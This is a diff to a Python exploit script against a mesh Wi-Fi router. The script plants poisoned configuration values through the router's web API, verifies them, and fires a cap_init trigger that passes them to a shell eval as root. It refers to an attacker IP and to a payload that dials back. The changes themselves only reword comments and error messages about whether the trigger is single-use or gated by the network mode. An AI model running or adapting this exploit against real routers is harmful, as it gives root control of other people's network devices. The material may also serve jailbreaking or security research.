@@ -201,9 +201,9 @@ def trigger_cap_init(ip_addr, ident = b'xmir0001', settle = 4.0):
     """type-4 -> type-5 -> type-7. cap_init reads the poisoned UCI values and
     hands them to mimesh_init.sh's eval, as root.
 
-    ONE-SHOT: cap_init persists NETMODE=whc_cap, which gates the sink until a
-    factory reset. Everything the payload will ever do, it does now -- so this
-    must never be called before the plant has been read back and confirmed.
+    A completed CAP initialization can persist NETMODE=whc_cap, which gates the
+    sink until the mode changes. This trigger must never be called before the
+    plant has been read back and confirmed.
     """
     sock = mesh_connect(ip_addr)
     print(f'Connected to cab_meshd on port {MESH_PORT} ({sock.version()})')
@@ -465,8 +465,8 @@ def plant(gw, attacker_ip, bands):
 
 
 def verify_plant(gw):
-    """Read the payloads back. This is the gate on the one-shot trigger: if the
-    filter ate them, firing would burn the only shot for nothing."""
+    """Read the payloads back. The trigger can close the mode gate, so do not
+    fire it if the filter ate the payloads."""
     seen = 0
     for w in (gw.api_request('API/xqnetwork/wifi_detail_all', resp = 'json', timeout = 8) or {}).get('info', []):
         enc = w.get('encryption', '')
@@ -485,19 +485,18 @@ if not gw.stok:
     raise ExploitNotWorked('Exploit "cap_init" not working!!! '
                            '(no admin session -- a WEB password or connect8 is required)')
 
-# The trigger is ONE-SHOT, so check it is armed before touching anything.  The
-# first cap_init persists NETMODE=whc_cap, and do_cap_init skips its whole
-# payload block -- including the mimesh_init eval -- when NETMODE is already
-# whc_cap.  Firing a spent unit therefore looks exactly like a broken exploit:
-# the plant succeeds, the trigger is accepted, and nothing ever dials back.
-# Say which one it is instead of planting a payload that cannot run.
+# Check the mode before touching anything. do_cap_init skips its payload block
+# (including the mimesh_init eval) when NETMODE is whc_cap. Normal stock web
+# setup can set that mode through init_cap 2; mesh commissioning or a prior
+# completed cap_init can also set it. Avoid planting a payload that cannot run.
 netmode_resp = gw.api_request('API/xqnetwork/get_netmode')
 netmode = (netmode_resp or {}).get('netmode')
 if netmode == 4:
     raise ExploitNotWorked(
-        'Exploit "cap_init" not working!!! (unit is DISARMED: NETMODE=whc_cap. '
-        'A previous cap_init consumed the one-shot and the sink stays gated '
-        'until the device is factory reset. Reset it to re-arm, then re-run.)')
+        'Exploit "cap_init" not working!!! (NETMODE=whc_cap: the payload path '
+        'is gated. Normal stock web setup can set this mode, as can mesh '
+        'commissioning or a prior completed cap_init. A reset followed by '
+        'the normal web wizard can set it again; see RD03v2-INSTALL.md.)')
 print(f'netmode = {netmode} (armed)')
 
 dn = gw.device_name
@@ -535,7 +534,7 @@ try:
         raise ExploitNotWorked(
             f'Exploit "cap_init" not working!!! only {seen}/2 payloads survived '
             'read-back (the web filter may have stripped them); NOT firing the '
-            'trigger, it is one-shot')
+            'trigger, which can close the mode gate')
 
     print('')
     print('The radios will bounce. To rejoin afterwards:')
